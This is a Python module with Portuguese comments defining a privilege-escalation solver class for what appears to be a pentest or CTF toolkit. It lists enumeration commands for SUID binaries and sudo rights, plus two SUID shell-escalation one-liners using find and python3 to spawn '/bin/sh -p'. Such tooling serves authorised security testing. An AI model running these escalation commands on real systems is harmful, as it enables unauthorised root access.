"""
Bounded Context: Privesc Domain Solver
Responsabilidade Única (SRP): Enumeração de escalada de privilégios e binários SUID.
"""
from typing import List, Dict, Any
from .base import BaseDomainSolver
from .registry import register_solver
from ..dtos.domain_dtos import AnalysisRequest, DomainAnalysisReport

@register_solver("privesc")
class PrivescDomainSolver(BaseDomainSolver):
    """Solver especializado para Escalada de Privilégios."""

    @property
    def domain_type(self) -> str:
        return "privesc"

    def get_checklist(self) -> List[Dict[str, str]]:
        return [
            {"name": "SUID binaries", "command": "find / -perm -u=s -type f 2>/dev/null", "description": "Binários SUID"},
            {"name": "Sudo permissions", "command": "sudo -l 2>/dev/null", "description": "Permissões sudo"},
        ]

    def get_suid_exploits(self) -> Dict[str, str]:
        return {
            "/usr/bin/find": "find . -exec /bin/sh -p \\; -quit",
            "/usr/bin/python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        }

    def analyze(self, request: AnalysisRequest) -> DomainAnalysisReport:
        return DomainAnalysisReport(
            domain=self.domain_type,
            success=True,
            observations=[self.get_checklist()],
            metadata={"target": request.target_resource}
        )
